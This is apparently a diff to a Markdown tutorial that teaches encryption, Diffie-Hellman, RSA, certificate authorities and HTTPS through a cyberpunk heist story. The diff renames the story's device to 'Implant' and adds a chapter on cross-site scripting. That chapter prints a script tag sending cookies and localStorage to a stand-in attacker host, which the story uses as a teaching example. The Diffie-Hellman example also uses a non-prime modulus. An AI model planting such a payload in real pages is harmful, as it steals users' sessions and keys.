@@ -4,7 +4,7 @@
 
 The neon smog of **Neo-Pune** choked the skyline. Anaya and Vikram sat in the back of a "Faraday Cafe" in the rusted underbelly of Shivajinagar. The walls were lined with copper mesh; it was the only place they could speak face-to-face without **The Syndicate** listening.
 
-"The Logic Bomb is planted," Anaya whispered, tapping the dormant server blade on the table before sliding it into her backpack. "I'm installing this inside the Syndicate's Hinjewadi Mainframe tonight. Once it's online, I need you to trigger it from the outside."
+"The Vampire Tap is primed," Anaya whispered, tapping the small, crab-like device on the table before sliding it into her backpack. "I'm clamping this onto the Syndicate's main fiber trunk in Hinjewadi tonight. Once it's biting the glass, I need you to trigger it from the outside."
 
 Vikram, a disgraced cyber-samurai with a carbon-fiber arm, frowned. "Triggering it requires sending the payload across the net. The Syndicate monitors *every* packet. If they see the command, they trace it back to us."
 
@@ -38,7 +38,7 @@ $$
 
 *Two days later.* 
 
-Anaya had successfully planted the node (The Server) inside the mainframe's cooling vents. Vikram was at a safehouse in Kothrud, ready to send the activation codes.
+Anaya had successfully clamped the **Implant** onto the mainframe's cooling intake lines, splicing gently into the data feed. Vikram was at a safehouse in Kothrud, ready to send the activation codes.
 
 They had agreed on a plan: **Symmetric Encryption** using **AES** (Advanced Encryption Standard).
 
@@ -64,7 +64,7 @@ Vikram felt secure because of **Cipher-Block-Chaining (CBC)**. It chained blocks
 
 ![CBC example](https://miro.medium.com/1*WzF5Rcsnb8gn3JmM-uumTQ.png)
 
-**The Problem:** The Server (Anaya's Node) needed the password `ChaiNiMaska` to decrypt it.
+**The Problem:** The Implant needed the password `ChaiNiMaska` to decrypt it.
 
 Vikram couldn't send the password over the net. So, he gave it to **Rohan**, a physical runner. "Get within range of the Hinjewadi tower," Vikram ordered. "Upload the key via short-range burst."
 
@@ -96,7 +96,7 @@ $$
 ```mermaid
 sequenceDiagram
     participant V as Vikram (Client)
-    participant A as Node (Server)
+    participant A as Implant (Server)
     
     Note over V,A: Setup phase (public parameters known)
     
@@ -114,19 +114,19 @@ Vikram ran the simulation with simple numbers to be sure:
 *   $g = 5$ (Base)
 *   $p = 135$ (Modulo)
 *   $x = 8$ (Vikram's Secret)
-*   $y = 9$ (Node's Secret)
+*   $y = 9$ (Implant's Secret)
 
 ![DFHKE](assets/dhke.gif)
 
 1. Vikram sent $g^x \pmod p$ -> `70`
-2. Node sent $g^y \pmod p$ -> `80`
+2. Implant sent $g^y \pmod p$ -> `80`
 3. Vikram calculated $(80)^8 \pmod {135} = 55$
-4. Node calculated $(70)^9 \pmod {135} = 55$
+4. Implant calculated $(70)^9 \pmod {135} = 55$
 
 They had a shared key: `55`.
 
 **The Failure:**
-The Syndicate's AI, **The Overseer**, was faster. It intercepted Vikram's `70`. It pretended to be the Node and sent its own number back. It then pretended to be Vikram and spoke to the Node.
+The Syndicate's AI, **The Overseer**, was faster. It intercepted Vikram's `70`. It pretended to be the Implant and sent its own number back. It then pretended to be Vikram and spoke to the Implant.
 
 The Overseer sat in the middle, decrypting Vikram's messages, reading "EXECUTE_Protocol_Zero", and blocking them.
 
@@ -140,7 +140,7 @@ Vikram stared at his screen. "Connection Timeout."
 
 *Faraday Cafe. Ten hours to the deadline.*
 
-"We need to know who we're talking to," Anaya said, rubbing her temples. "The Node needs to prove it's *my* Node, not a Syndicate honeypot. And you need to be sure only *my* Node can read the command."
+"We need to know who we're talking to," Anaya said, rubbing her temples. "The Implant needs to prove it's *my* device, not a Syndicate honeypot. And you need to be sure only *my* Implant can read the command."
 
 "**RSA**," Vikram said. "Public and Private keys."
 
@@ -160,16 +160,16 @@ $$
 msg = rsa(cipher, publicKey)
 $$
 
-"I'll encrypt the command with the Node's **Public Key** so only the Node can read it. And the Node will sign its responses with its **Private Key** so I know it's real."
+"I'll encrypt the command with the Implant's **Public Key** so only the Implant can read it. And the Implant will sign its responses with its **Private Key** so I know it's real."
 
-Anaya remotely updated the Node's firmware to generate keys:
+Anaya remotely updated the Implant's firmware to generate keys:
 
 ```shell
 openssl genpkey -algorithm RSA -out node_private.pem -pkeyopt rsa_keygen_bits:2048
 openssl rsa -pubout -in node_private.pem -out node_public.pem
 ```
 
-But Vikram hesitated. "How do I get the Node's Public Key? If the Node sends it to me, the Overseer could intercept it and send *his* fake Public Key instead."
+But Vikram hesitated. "How do I get the Implant's Public Key? If the Implant sends it to me, the Overseer could intercept it and send *his* fake Public Key instead."
 
 They were back to the trust problem.
 
@@ -181,7 +181,7 @@ They were back to the trust problem.
 
 They contacted **The Rishi**, a legendary hacker collective that acted as the root of trust for the resistance. The Rishi's "Root Certificate" was already hardwired into Vikram's deck (`/etc/ssl/certs`).
 
-**Step 1:** Anaya ordered the Node to generate a **Certificate Signing Request (CSR)**.
+**Step 1:** Anaya ordered the Implant to generate a **Certificate Signing Request (CSR)**.
 
 ```shell
 openssl req -new -sha256 -nodes -out node.syndicate.net.csr -newkey rsa:2048 -keyout node_private.key -config <(
@@ -212,7 +212,7 @@ EOF
 
 **Step 2:** Anaya routed this request to The Rishi via a dead-drop.
 
-**Step 3:** The Rishi verified Anaya's signature and signed the Node's certificate using their Root Key.
+**Step 3:** The Rishi verified Anaya's signature and signed the Implant's certificate using their Root Key.
 
 *(The Rishi's Setup - done previously)*:
 ```shell
@@ -224,14 +224,14 @@ openssl req -x509 -sha256 -nodes -days 3650 -newkey rsa:4096 -keyout rishi.key -
 openssl x509 -req -in node.syndicate.net.csr -CA rishi.crt -CAkey rishi.key -CAcreateserial -out signed_certificate.crt -days 365 -sha256
 ```
 
-Now, the Node had a Digital ID Card (`signed_certificate.crt`) signed by The Rishi.
+Now, the Implant had a Digital ID Card (`signed_certificate.crt`) signed by The Rishi.
 
 **The Final Setup (HTTPS):**
 
-Anaya programmed the Node (The Server) to present this certificate to anyone who connected.
+Anaya programmed the Implant to present this certificate to anyone who connected.
 
 ```javascript
-// The Logic Bomb Node (Server)
+// The Logic Bomb Implant (Server)
 const https = require('https');
 const fs = require('fs');
 
@@ -253,11 +253,11 @@ https.createServer(options, (req, res) => {
 
 Vikram sat on a rooftop in Magarpatta, rain slicking his deck. The Syndicate's drones circled overhead. This was it.
 
-He initiated the connection to the Node inside the Mainframe.
+He initiated the connection to the Implant inside the Mainframe.
 
 **Step 1: Handshake**
 Vikram's Deck: "Hello?"
-Node: "Here is my Certificate."
+Implant: "Here is my Certificate."
 Vikram's Deck: *Checks signature against The Rishi's Root.* **VALID.**
 
 ![Checking certificate](assets/certificate-check.gif)
@@ -269,28 +269,28 @@ The Secure Tunnel was established.
 
 ```mermaid
 sequenceDiagram
-    participant Node
+    participant Implant
     participant CA as Rishi
     participant Vikram
 
     Note over Vikram: Browsing to https://syndicate-mainframe.node
-    Node->>Vikram: Sends Signed Certificate
-    Vikram->>Vikram: Verifies Signature (Trusts Node)
-    Vikram->>Node: Key Exchange (Encrypted)
-    Note over Vikram, Node: Tunnel Established. Surveillance Blinded.
+    Implant->>Vikram: Sends Signed Certificate
+    Vikram->>Vikram: Verifies Signature (Trusts Implant)
+    Vikram->>Implant: Key Exchange (Encrypted)
+    Note over Vikram, Implant: Tunnel Established. Surveillance Blinded.
 ```
 
 **Step 3: The Command**
 
 Vikram smiled. "The tunnel is secure. The Overseer is blind. It sees traffic, but only static."
 
-He typed the command to the Node:
+He typed the command to the Implant:
 `> INITIATE_TRANSFER(1,000,000,000 credits TO destination_wallet)`
 `> USER: Anaya_Rao` (Using Anaya's stolen credentials)
 
-The command flew through the encrypted tunnel, bypassing the firewalls, and landed directly in the Node's kernel inside the Mainframe.
+The command flew through the encrypted tunnel, bypassing the firewalls, and landed directly in the Implant's kernel inside the Mainframe.
 
-The Node executed the request against the Syndicate's Core Banking System.
+The Implant executed the request against the Syndicate's Core Banking System.
 
 ---
 
@@ -447,3 +447,64 @@ They vanished into the neon rain, 1 billion credits richer—and a hell of a lot
 
 > **The End?** 
 > *Security is never finished. It is only improved.*
+
+---
+
+## Chapter 10: The Trojan Horse (XSS)
+
+*The ShadowMarket. 12 hours later.*
+
+They had the money. 1 Billion credits sitting in a "clean" wallet. But in Neo-Pune, clean money is suspicious. They needed to wash it.
+
+Vikram navigated to `The_Washer`, a notorious laundry service on the darknet. "This guy takes a 20% cut, but he sends back untraceable crypto-chips."
+
+The site was simple. A black background, a neon spinner, and a chat board where "Verified Sellers" posted their transfer rates.
+
+**The Setup:**
+
+Anaya scrolled through the sellers. One profile, **CyberKing_99**, had a gold "Verified" badge and a 5-star rating.
+"Look," Anaya pointed. "He's offering 5% fees today. Special offer."
+
+She clicked on **CyberKing_99**'s profile to get his wallet address.
+
+**The Attack:**
+
+The moment the profile loaded, nothing seemed to happen. The wallet address appeared. Anaya copied it and initiated the transfer of the 1 Billion credits.
+
+"Transfer complete," she said, leaning back. "Now we wait for the chips."
+
+They waited. And waited.
+
+Ten minutes later, Vikram checked their balance. **ZERO.**
+
+"He got the chips?" Vikram asked.
+
+"No," Anaya's face went pale. "The chips never came. And... my other wallet is empty too. My private keys... they're gone."
+
+**The Autopsy:**
+
+Vikram tore through the source code of **CyberKing_99**'s profile page. He found it. Buried in the "About Me" section of the seller's profile was a line of code that the website hadn't sanitized.
+
+```html
+<script>
+  fetch('https://malicious-site.com/steal?cookies=' + document.cookie + '&localstorage=' + JSON.stringify(localStorage));
+</script>
+```
+
+**The Explanation:**
+
+1.  **The Flaw:** The darknet site trusted its users. It didn't "sanitize" the input in the "About Me" section. It let users type HTML.
+2.  **The Trap:** The attacker didn't hack Anaya. He hacked the *page* Anaya was looking at. He injected a **Cross-Site Script (XSS)**.
+3.  **The Execution:** When Anaya loaded the profile, her browser obeyed the script. It silently packaged up her **Session Cookies** and her **Local Storage** (where her temporary wallet keys were stored) and sent them to the attacker.
+
+"We worried about the front door," Vikram whispered, staring at the empty screen. "We worried about encryption, and keys, and authorization."
+
+"But we let a stranger inside the house," Anaya finished, "just because they had a verified badge."
+
+They were back to zero. No money. No safehouse. One broken arm.
+
+But they were alive. And in Neo-Pune, that was the only currency that mattered.
+
+**Lesson:** Never trust input. Not even from a King.
+
+> **THE END?**
